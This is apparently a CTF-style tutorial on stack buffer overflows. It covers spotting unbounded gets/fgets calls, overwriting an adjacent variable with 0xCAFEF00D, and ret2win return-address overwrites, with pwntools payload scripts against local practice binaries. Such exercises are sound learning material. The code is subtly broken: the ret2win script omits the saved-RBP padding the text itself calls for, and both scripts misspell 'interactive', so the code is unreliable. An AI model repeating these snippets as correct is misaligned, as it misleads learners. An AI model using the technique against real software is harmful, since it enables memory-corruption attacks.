# Stack Overflow
## Identification
We can know there is buffer or stack overflow vulnerabilities when a input function without limit or the limit is exceed the buffer capacity. 
Example:
```
char buff[50]
gets(buff)     // gets function will take input without limit until reach null terminator
```

or with limit with `fgets()`
```
char buff[50]
fgets(buff, 100, stdin) // fgets take input 100 char but the buffer capacity only 50 char
```

## Exploitation and Vulnerabilities
### Variables Arbitrary Write
This one the most simple one. If you can see there is two variables next each other and one of them is the buffer and the other will compared later.  
The example of the source code are like this
```
int cmp
char buff[20]
gets(buff)
if(cmp == 0xCAFEF00D)
{
    win()
}
```
You can see on that code. We need to change the cmp value to `0xCAFEF00D` so that we can call win function. We can send it using python code with `pwntools` module or we can inject it with pipe directly.  
We know the buffer capacity is 20, then we need fill the buffer first then input desired value for the `cmp`.  
so the payload will go like this  
`b'AAAAAAAAAAAAAAAAAAAA\x0D\xF0\xFE\xCA'`  
the reason for the payload is reversed because the memory stores value with little-endian encoding and the reason for we store it `\x0D` because we input it as char but there is no readable char representation for it so we use byte string to input char based on its hex value.  
Payload  
```
p = process('./var')

payload = b'A' * 20   # Padding
payload += b'\x0D\xF0\xFE\xCA' # Desired value
# OR We can use
payload += p64(0xCAFEF00D) # or p32 for x86 architecture

p.sendline(payload)
p.interactve()
```
`p64` or `p32` function is used for convert integer to 8 bytes or 4 bytes little-endian encoding or pack the integer based on system architecture

### Ret2Win
This one bit more interesting then one before.  
Ret2win is exploitation where we overwrites the function return address so that we can return to desired function. To understand it further, I will give simple memory stack layout  
```
 ============
|  Ret Addr  |
 ============
|  Old RBP   | <= RBP
 ============
|            |
|            |
|   Buffer   |
|            |
|            | <= RSP
 ============
```
so, our input will starting from the base of the buffer and fill upwards. if there is no limit in the input, we can overwrite the old rbp even return address.  
Source Code Example:  
```
void win()
{
    puts(flag)
}

void vuln()
{
    char buff[20]
    gets(buff)
}

int main()
{
    vuln()        
}
```
Same as before, the buffer capacity is 20. so we need to fill it first so we can reach old RBP. RBP is a register that save a pointer. So, Old RBP section must be contain 8 bytes for x86-64 or 4 bytes for x86. so we need add the padding for fill the old RBP section before reach return address.  
Payload:  
`b'A' * 20 + b'B' * 8 + <win address>`  
Let say the win function located at `0x12345`  
so our full code goes like this  
```
p = process('./var')

payload = b'A' * 20   # Padding
payload += p64(0x12345) # or p32 for x86 architecture

p.sendline(payload)
p.interactve()
```  

**Section after this will explain how ret2win works more detail, if you don't feel interested or you already understand you can skip it**  
So if you wondering how this is works, like why return address located there ? why there is old RBP saved on stack ?  
We need know how call and ret instruction works  
So when program called a function or a another instruction, it also will save the address of next instruction after the call.  
Disassemble code example :  
```
.
.
.
0x24 <main+20> call vuln
0x25 <main+21> mov rax 0x8(rbp)
.
.
.

0x123 <vuln> push rbp
0x124 <vuln+1> mov rbp, rsp
.
.
.
0x13a <vuln+23> ret
```  
There is one register to manage how the program run, the name is `rip` ( on x86-64 ).
`RIP` will save next instruction so the program know what instruction will be executed.  
so when `call` instruction is executed, the `RIP` value is saved on the stack with `push RIP` (means RIP value will save on top of the stack which means located on where rsp point to) and then RIP will save the called function address. if we see on the example the pushed value will be `0x25` and the RIP will have `0x123`.  
when ret is executed, the RSP register will point to return address means it will point to `0x25` again. the ret instruction is equal to `pop rip`, so the value on the top of the stack will saved again at rip register. so the program will be back to `0x25`.  
Now, if we change the `0x25`, we can control the program flows. That's what we doing in ret2win, we change the return address value so when ret is called. The `RIP` register have the desired function address, not the caller address.
